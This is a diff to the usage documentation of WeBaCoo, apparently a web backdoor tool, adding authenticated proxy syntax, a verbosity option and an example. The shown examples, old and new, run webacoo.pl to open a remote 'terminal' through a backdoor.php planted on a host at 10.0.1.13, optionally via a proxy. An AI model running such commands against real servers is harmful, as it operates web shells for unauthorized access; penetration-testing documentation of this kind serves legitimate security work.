@@ -50,7 +50,13 @@ Options:
 
   -a AGENT	HTTP header user-agent (default exist)
 
-  -p PROXY	Use proxy IP:PORT
+  -p PROXY	Use proxy (IP:PORT or USER:PASS:IP:PORT)
+
+  -v LEVEL	Verbose level
+	LEVEL
+		0: no additional info (default)
+		1: print HTTP headers
+		2: print HTTP headers + data
 
   -h		Display help and exit
 
@@ -72,3 +78,6 @@ Examples
 
 5. Establish "terminal" connection with remote host through local http proxy
 ./webacoo.pl -t -u http://10.0.1.13/backdoor.php -p 127.0.0.1:8080
+
+6. Establish "terminal" connection with remote host through http proxy with basic auth
+./webacoo.pl -t -u http://10.0.1.13/backdoor.php -p user:password:10.0.1.8:3128
